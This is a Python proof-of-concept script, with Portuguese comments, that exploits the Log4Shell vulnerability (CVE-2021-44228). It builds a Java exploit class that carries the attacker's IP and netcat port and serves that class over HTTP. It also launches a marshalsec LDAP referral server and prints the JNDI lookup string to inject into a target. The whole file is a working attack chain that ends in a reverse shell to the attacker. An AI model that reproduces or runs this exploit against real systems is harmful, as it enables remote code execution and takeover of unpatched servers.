#!/usr/bin/env python3

import argparse
from colorama import Fore, init
import subprocess
import threading
from pathlib import Path
import os
from http.server import HTTPServer, SimpleHTTPRequestHandler

CUR_FOLDER = Path(__file__).parent.resolve()

def generate_payload(userip: str, lport: int) -> None:
    # Lê o conteúdo do arquivo Exploit.java
    with open('ExploitBase.java', 'r') as file:
        program = file.read() % (userip, lport)

    # Escreve o código do exploit em um arquivo Exploit.java
    p = Path("Exploit.java")

    try:
        p.write_text(program)
        subprocess.run([os.path.join(CUR_FOLDER, "jdk1.8.0_20/bin/javac"), str(p)])
    except OSError as e:
        print(Fore.RED + f'[-] Algo deu errado {e}')
        raise e
    else:
        print(Fore.GREEN + '[+] Classe Java do exploit criada com sucesso')

def payload(userip: str, webport: int, lport: int) -> None:
    generate_payload(userip, lport)

    print(Fore.GREEN + '[+] Configurando servidor LDAP\n')

    # Cria o servidor LDAP em uma nova thread
    t1 = threading.Thread(target=ldap_server, args=(userip, webport))
    t1.start()

    # Inicia o servidor web
    print(f"[+] Iniciando o servidor web na porta {webport} http://0.0.0.0:{webport}")
    httpd = HTTPServer(('0.0.0.0', webport), SimpleHTTPRequestHandler)
    httpd.serve_forever()

def check_java() -> bool:
    exit_code = subprocess.call([
        os.path.join(CUR_FOLDER, 'jdk1.8.0_20/bin/java'),
        '-version',
    ], stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
    return exit_code == 0

def ldap_server(userip: str, lport: int) -> None:
    sendme = "${jndi:ldap://%s:1389/a}" % (userip)
    print(Fore.GREEN + f"[+] Envie isso: {sendme}\n")

    url = "http://{}:{}/#Exploit".format(userip, lport)
    subprocess.run([
        os.path.join(CUR_FOLDER, "jdk1.8.0_20/bin/java"),
        "-cp",
        os.path.join(CUR_FOLDER, "target/marshalsec-0.0.3-SNAPSHOT-all.jar"),
        "marshalsec.jndi.LDAPRefServer",
        url,
    ])

def main() -> None:
    init(autoreset=True)
    print(Fore.BLUE + """
[!] CVE: CVE-2021-44228
[!] Repositório no Github: https://github.com/kozmer/log4j-shell-poc
""")

    parser = argparse.ArgumentParser(description='Prova de conceito do log4shell')
    parser.add_argument('--userip',
                        metavar='userip',
                        type=str,
                        default='localhost',
                        help='Insira o IP para o LDAPRefServer e Shell')
    parser.add_argument('--webport',
                        metavar='webport',
                        type=int,
                        default='8000',
                        help='Porta de escuta para o servidor HTTP')
    parser.add_argument('--lport',
                        metavar='lport',
                        type=int,
                        default='9001',
                        help='Porta do Netcat')

    args = parser.parse_args()

    try:
        if not check_java():
            print(Fore.RED + '[-] Java não está instalado no repositório')
            raise SystemExit(1)
        payload(args.userip, args.webport, args.lport)
    except KeyboardInterrupt:
        print(Fore.RED + "O usuário interrompeu o programa.")
        raise SystemExit(0)

if __name__ == "__main__":
    main()